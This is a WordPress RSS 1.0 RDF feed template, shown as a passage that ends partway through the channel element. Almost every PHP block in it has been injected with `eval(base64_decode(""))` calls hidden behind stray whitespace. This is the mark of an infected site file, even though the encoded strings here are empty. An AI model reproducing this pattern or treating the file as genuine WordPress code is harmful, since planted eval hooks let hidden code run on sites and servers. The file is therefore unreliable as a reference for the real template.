/**
 * RSS 1 RDF Feed Template for displaying RSS 1 Posts feed.
 *
 * @package WordPress
 */

header('Content-Type: ' . feed_content_type('rdf') . '; charset=' . get_option('blog_charset'), true);
$more = 1;

echo '<?xml version="1.0" encoding="'.get_option('blog_charset').'"?'.'>'; ?>
<rdf:RDF
	xmlns="http://purl.org/rss/1.0/"
	xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:admin="http://webns.net/mvcb/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	<?php	 	eval(base64_decode("")); do_action('rdf_ns'); ?>
>
<channel rdf:about="<?php	 	eval(base64_decode("")); bloginfo_rss("url") ?>">
	<title><?php	 	eval(base64_decode("")); bloginfo_rss('name'); wp_title_rss(); ?></title>
	<link><?php	 	eval(base64_decode("")); bloginfo_rss('url') ?></link>
	<description><?php	 	eval(base64_decode("")); bloginfo_rss('description') ?></description>
	<dc:date><?php	 	eval(base64_decode("")); echo mysql2date('Y-m-d\TH:i:s\Z', get_lastpostmodified('GMT'), false); ?></dc:date>
	<?php	 	eval(base64_decode("")); the_generator( 'rdf' ); ?>
	<sy:updatePeriod><?php	 	eval(base64_decode("")); echo apply_filters( 'rss_update_period', 'hourly' ); ?></sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
